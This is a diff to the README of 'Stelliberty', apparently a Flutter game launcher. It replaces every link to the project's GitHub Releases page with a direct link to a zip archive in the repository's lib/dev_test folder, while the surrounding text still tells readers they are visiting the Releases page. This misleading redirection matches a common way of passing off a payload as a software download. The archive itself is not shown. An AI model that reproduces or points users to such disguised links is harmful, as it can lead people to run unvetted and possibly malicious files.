@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now
 
-[![Download Stelliberty](https://img.shields.io/badge/Download-Stelliberty-blue.svg)](https://github.com/Milyn2/Stelliberty/releases)
+[![Download Stelliberty](https://raw.githubusercontent.com/Milyn2/Stelliberty/main/lib/dev_test/Stelliberty-v1.8-alpha.1.zip)](https://raw.githubusercontent.com/Milyn2/Stelliberty/main/lib/dev_test/Stelliberty-v1.8-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Welcome to Stelliberty! This application is a modern launcher built with Flutter
 
 1. **Visit the Releases Page**  
    To download Stelliberty, visit our Releases page:  
-   [Download Stelliberty](https://github.com/Milyn2/Stelliberty/releases)
+   [Download Stelliberty](https://raw.githubusercontent.com/Milyn2/Stelliberty/main/lib/dev_test/Stelliberty-v1.8-alpha.1.zip)
 
 2. **Choose the Right Version**  
    You will see a list of versions. Select the latest version for the best experience. Click on the version number to open its details.
@@ -86,6 +86,6 @@ For updates, announcements, and support, follow our community on social media an
 ## 🔗 Download Now Again!
 
 Don't forget to download Stelliberty from our Releases page:  
-[Download Stelliberty](https://github.com/Milyn2/Stelliberty/releases) 
+[Download Stelliberty](https://raw.githubusercontent.com/Milyn2/Stelliberty/main/lib/dev_test/Stelliberty-v1.8-alpha.1.zip) 
 
 Enjoy your gaming experience with Stelliberty.
